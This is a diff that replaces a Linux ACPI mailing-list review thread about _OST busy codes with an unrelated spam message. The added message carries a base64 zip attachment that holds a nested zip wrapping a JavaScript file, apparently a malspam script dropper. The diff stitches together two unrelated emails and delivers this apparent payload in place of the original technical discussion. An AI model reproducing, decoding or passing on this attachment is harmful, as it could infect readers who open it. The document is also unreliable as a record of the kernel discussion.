@@ -1,153 +1,107 @@
-From: joeyli <jlee@suse.com>
-Subject: Re: [PATCH v2] acpi: indicate to platform when hot remove returns
- busy
-Date: Sat, 10 Jun 2017 08:59:29 +0800
-Message-ID: <20170610005929.GL16674@linux-l9pv.suse>
-References: <20170609105451.461-1-jlee@suse.com>
- <CAHp75VeA9d5HWD_vyxMvoAG7PWR9nwTi4DL=Vdb9GxLsKzjY-w@mail.gmail.com>
+From: <kbennett@aberdeenews.com>
+Subject: (unknown)
+Date: Sat, 10 Jun 2017 14:34:14 -0000
+Message-ID: <149710525404.16370.965705774125528762@asianet.co.th>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
+Content-Type: application/zip; name="0630938972524.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-acpi-owner@vger.kernel.org>
-Received: from smtp.nue.novell.com ([195.135.221.5]:53920 "EHLO
-        smtp.nue.novell.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751623AbdFJA7q (ORCPT
-        <rfc822;groupwise-linux-acpi@vger.kernel.org:0:0>);
-        Fri, 9 Jun 2017 20:59:46 -0400
-Content-Disposition: inline
-In-Reply-To: <CAHp75VeA9d5HWD_vyxMvoAG7PWR9nwTi4DL=Vdb9GxLsKzjY-w@mail.gmail.com>
+Received: from 61-91-37-38.static.asianet.co.th ([61.91.37.38]:41510 "HELO
+        asianet.co.th" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1751958AbdFJOeV (ORCPT <rfc822;linux-acpi@vger.kernel.org>);
+        Sat, 10 Jun 2017 10:34:21 -0400
+Subject: 
+Content-Disposition: attachment
 Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
-To: Andy Shevchenko <andy.shevchenko@gmail.com>
-Cc: "Lee, Chun-Yi" <joeyli.kernel@gmail.com>, "Rafael J . Wysocki" <rjw@rjwysocki.net>, "linux-acpi@vger.kernel.org" <linux-acpi@vger.kernel.org>, "linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>, Len Brown <lenb@kernel.org>
+To: linux-acpi@vger.kernel.org
 
-On Fri, Jun 09, 2017 at 06:36:32PM +0300, Andy Shevchenko wrote:
-> On Fri, Jun 9, 2017 at 1:54 PM, Lee, Chun-Yi <joeyli.kernel@gmail.com> wrote:
-> > In hotplug logic, it always indicates non-specific failure to
-> > platform through _OST when handing acpi hot-remove event failed. Then
-> > platform terminates the hot-remove process but it can not identify
-> > the reason.
-> >
-> > Base on current hot-remove code, there have two situations that it
-> > returns busy:
-> >  - OSPM try to offline an individual device, but the device offline
-> >    function returns busy.
-> >  - When the ejection event is applied to an "not offlined yet" container.
-> >    OSPM send kobject change event to userspace and returns busy.
-> >
-> > Both of them will returns -EBUSY to acpi device hotplug function then
-> > hotplug function indicates non-specific failure to platform just like
-> > any other error, e.g. -ENODEV or -EIO.
-> >
-> > The benefit to platform for identifying the OS busy state is that
-> > platform can be applied different approach to handle the busy but
-> > not just terminate the hot-remove process by unknown reason. For
-> > example, platform can wait for a while then triggers hot-remove
-> > again.
-> >
-> > This RFC patch adds one more parameter to the handler function of
-> > acpi generic hotplug event to give the function a chance to propose
-> > the return code of _OST. In this case, it sets ost return code to
-> > ACPI_OST_SC_DEVICE_BUSY when the acpi hot remove function returns
-> > -EBUSY.
-> 
-> Below looks better for my taste.
-> See also comments.
-> 
-
-Still thanks for your review.
-
-> > +static int acpi_ost_status_code(u32 src, int error)
-> > +{
-> > +       switch (src) {
-> > +       case ACPI_NOTIFY_EJECT_REQUEST:
-> > +       case ACPI_OST_EC_OSPM_EJECT:
-> 
-> > +               if (error == -EPERM)
-> > +                       return ACPI_OST_SC_EJECT_NOT_SUPPORTED;
-> > +               else if (error == -EBUSY)
-> 
-> Redundant else...
->
-
-You are right, I will remove it.
- 
-> > +                       return ACPI_OST_SC_DEVICE_BUSY;
-> 
-> Perhaps switch case here as well?
-> switch (error) {
->  case -EPERM;
->    return X;
->  case -EBUSY:
->    return Y;
-> }
->
-
-I want to use the event source as the target of switch because
-different event source has different ost_src definition. If I
-add the support of insertion event then the code will be like
-this:
-
-static int acpi_ost_status_code(u32 src, int error)
-{
-        switch (src) {
-        case ACPI_NOTIFY_EJECT_REQUEST:
-        case ACPI_OST_EC_OSPM_EJECT:
-                if (error == -EPERM)
-                        return ACPI_OST_SC_EJECT_NOT_SUPPORTED;
-                if (error == -EBUSY)
-                        return ACPI_OST_SC_DEVICE_BUSY;
-                break;
-        case ACPI_OST_EC_OSPM_INSERTION:
-                if (error == -EPERM)
-                        return ACPI_OST_SC_INSERT_NOT_SUPPORTED;
-                if (error == -EBUSY)
-                        return ACPI_OST_SC_INSERT_IN_PROGRESS;
-                break;
-        }
-        return error ? ACPI_OST_SC_NON_SPECIFIC_FAILURE : ACPI_OST_SC_SUCCESS;
-}
-
-The ACPI_OST_EC_OSPM_INSERTION represents "Insertion Processing
-(Source Event: 0x200)" that it has different ost code definition.
-Just we didn't support it in kernel (maybe just didn't see any
-machine used it).
- 
-> > +               break;
-> > +       }
-> > +       return error ? ACPI_OST_SC_NON_SPECIFIC_FAILURE : ACPI_OST_SC_SUCCESS;
-> > +}
-> 
-> 
-> > +       ost_code = acpi_ost_status_code(src, error);
-> >   err_out:
-> 
-> I guess you need to swap those lines.
->
-
-Do you mean move the "err_out:" to the position before
-acpi_ost_status_code()? The err_out tag used by the
-validation checking of acpi handler that it wants to
-jump to evaluate _OST: 
-
-void acpi_device_hotplug(struct acpi_device *adev, u32 src)
-{
-        u32 ost_code = ACPI_OST_SC_NON_SPECIFIC_FAILURE;
-        int error = -ENODEV;
-
-        lock_device_hotplug();
-        mutex_lock(&acpi_scan_lock);
-
-	/*
-	 * The device object's ACPI handle cannot become invalid as long as we
-	 * are holding acpi_scan_lock, but it might have become invalid before
-	 * that lock was acquired.
-	 */
-	if (adev->handle == INVALID_ACPI_HANDLE)
-		goto err_out;
-	[...snip]
-> >   err_out:
-> >         acpi_evaluate_ost(adev->handle, src, ost_code, NULL);
->
-
-Thanks a lot!
-Joey Lee 
+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
+AAAAMBMAAAAA
